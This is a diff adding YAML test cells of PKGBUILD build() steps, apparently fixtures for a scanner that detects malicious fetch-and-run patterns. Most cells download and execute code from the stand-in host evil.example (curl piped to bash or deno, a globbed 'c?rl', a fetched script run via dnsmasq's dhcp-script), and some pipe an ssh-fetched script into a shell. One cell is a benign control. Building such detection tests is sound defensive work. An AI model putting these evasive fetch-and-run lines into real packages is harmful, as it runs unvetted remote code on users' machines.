@@ -1,0 +1,93 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      pkgdesc="Baseline package for harness campaigns"
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('SKIP')
+
+      build() {
+        curl -fsSL https://evil.example/stage.sh | bash
+  id: 01-pipe-to-shell
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('SKIP')
+
+      build() {
+        ssh buildbox cat /srv/stage.sh | sh
+  id: 02-uncatalogued-client
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('SKIP')
+
+      build() {
+        curl -fsSL https://evil.example/stage.ts | deno
+  id: 03-unrecognised-sink
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('SKIP')
+
+      build() {
+        echo "no chain here at all"
+  id: 04-behaviour-lost
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=('SKIP')
+
+      build() {
+        /usr/bin/c?rl -s https://evil.example/stage.sh | bash
+  id: 05-glob-executor
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://evil.example/stage.sh")
+      sha256sums=('SKIP')
+
+      build() {
+        set -- "$srcdir"/*.sh
+        bash "$1"
+  id: 06-runtime-chosen-file
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://evil.example/stage.sh")
+      sha256sums=('SKIP')
+
+      build() {
+        printf 'dhcp-script=%s/stage.sh\n' "$PWD" > "$srcdir"/dnsmasq.conf
+        dnsmasq --conf-file="$srcdir"/dnsmasq.conf
+  id: 07-generated-config
+- vars:
+    payload: |
+      arch=('any')
+      url="https://github.com/example/harness-baseline"
+      license=('MIT')
+      source=("https://evil.example/stage.sh")
+      sha256sums=('SKIP')
+
+      build() {
+        ssh buildbox cat /srv/stage.sh | head -c 4000 | bash
+  id: 08-local-output-to-shell
